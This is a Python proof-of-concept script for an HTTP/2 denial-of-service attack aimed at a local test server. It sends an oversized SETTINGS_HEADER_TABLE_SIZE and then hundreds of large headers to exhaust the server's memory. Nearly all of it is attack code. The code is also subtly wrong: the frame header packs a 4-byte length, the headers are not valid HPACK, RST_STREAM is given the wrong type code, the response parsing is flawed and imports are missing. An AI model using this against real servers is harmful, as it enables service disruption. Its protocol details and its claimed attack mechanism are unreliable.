# Note: This script uses raw socket manipulation to demonstrate the exact protocol steps.
# For production testing, libraries like 'h2' or 'hyper' are recommended, but raw sockets
# clearly show the vulnerability mechanics described in RFC 9113.

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8443

# HTTP/2 Connection Preface
HTTP2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def pack_h2_frame(frame_type, flags, stream_id, payload):
    """Pack a raw HTTP/2 frame."""
    length = len(payload)
    # Frame format: 3-byte length, 1-byte type, 1-byte flags, 4-byte stream ID
    header = struct.pack(">IBB", length, frame_type, flags)
    header += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return header + payload

def send_settings_large_table(sock, table_size=0xFFFFFFFF):
    """Send SETTINGS frame with a massive HEADER_TABLE_SIZE."""
    # SETTINGS_HEADER_TABLE_SIZE identifier is 0x01
    # Value is 32-bit integer
    settings_payload = struct.pack(">HI", 0x01, table_size)
    frame = pack_h2_frame(0x04, 0x00, 0x00, settings_payload) # Type 0x04 = SETTINGS
    sock.sendall(frame)
    print(f"[*] Sent SETTINGS with HEADER_TABLE_SIZE = {table_size}")

def send_settings_ack(sock):
    """Send empty SETTINGS frame as ACK."""
    frame = pack_h2_frame(0x04, 0x01, 0x00, b"") # Flags 0x01 = ACK
    sock.sendall(frame)
    print("[*] Sent SETTINGS ACK")

def send_large_headers(sock, stream_id, num_headers=100, header_size=1024):
    """Send HEADERS frame with many large unique headers to fill the dynamic table."""
    # Construct raw HPACK-like payload (simplified for PoC: uncompressed headers)
    # In a real attack, proper HPACK encoding would be used to force table insertion.
    # Here we simulate the payload size pressure.
    
    header_block = b""
    for i in range(num_headers):
        # Format: :name: value\r\n (simplified representation)
        # Real HPACK uses specific encoding, but large unique fields force table growth
        name = f"x-custom-header-{i}".encode()
        value = b"A" * header_size
        # Simple representation of a header field for demonstration
        # Actual HPACK encoding would use literals with indexing
        header_block += struct.pack(">B", len(name)) + name + struct.pack(">B", len(value)) + value
        
    # HEADERS frame type is 0x01
    # Flags: 0x04 (END_HEADERS)
    frame = pack_h2_frame(0x01, 0x04, stream_id, header_block)
    sock.sendall(frame)
    print(f"[*] Sent HEADERS with {num_headers} headers of size ~{header_size} bytes each")

def main():
    print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}...")
    try:
        # Create TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Wrap with SSL if needed (HTTP/2 usually requires TLS)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        ssl_sock = context.wrap_socket(sock, server_hostname=TARGET_HOST)
        
        ssl_sock.connect((TARGET_HOST, TARGET_PORT))
        print("[+] Connected successfully.")
        
        # Step 1: Send HTTP/2 Connection Preface
        ssl_sock.sendall(HTTP2_PREFACE)
        print("[*] Sent HTTP/2 Connection Preface")
        
        # Step 2: Send SETTINGS with oversized HEADER_TABLE_SIZE
        # RFC 9113 Section 6.5.2: SETTINGS_HEADER_TABLE_SIZE (0x01)
        # Attacker sets this to a very large value (up to 2^32 - 1)
        send_settings_large_table(ssl_sock, table_size=0xFFFFFFFF)
        
        # Wait for SETTINGS ACK from server
        data = ssl_sock.recv(4096)
        if not data:
            print("[!] Connection closed by server.")
            return
        print(f"[*] Received {len(data)} bytes from server (likely SETTINGS ACK)")
        
        # Step 3: Send HEADERS with many large unique fields
        # This forces the server's HPACK decoder to allocate memory for the dynamic table
        stream_id = 1
        send_large_headers(ssl_sock, stream_id, num_headers=500, header_size=2048)
        
        # Step 4: Observe outcome
        # A vulnerable server may experience memory exhaustion or high CPU usage
        # A patched server should reject the SETTINGS or limit the table size
        print("[*] Waiting for server response...")
        try:
            ssl_sock.settimeout(5.0)
            response = ssl_sock.recv(4096)
            if response:
                print(f"[+] Server responded with {len(response)} bytes")
                # Check for HTTP/2 GOAWAY or RST_STREAM
                if response[0] == 0x07: # GOAWAY frame type
                    print("[!] Server sent GOAWAY - possible rejection of oversized settings")
                elif response[0] == 0x08: # RST_STREAM frame type
                    print("[!] Server sent RST_STREAM - stream reset")
                else:
                    print("[*] Server processed request (potential vulnerability if memory spiked)")
            else:
                print("[!] No response received - server may be hanging or crashed")
        except socket.timeout:
            print("[!] Timeout waiting for response - server may be under resource pressure")
            
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        ssl_sock.close()

if __name__ == "__main__":
    main()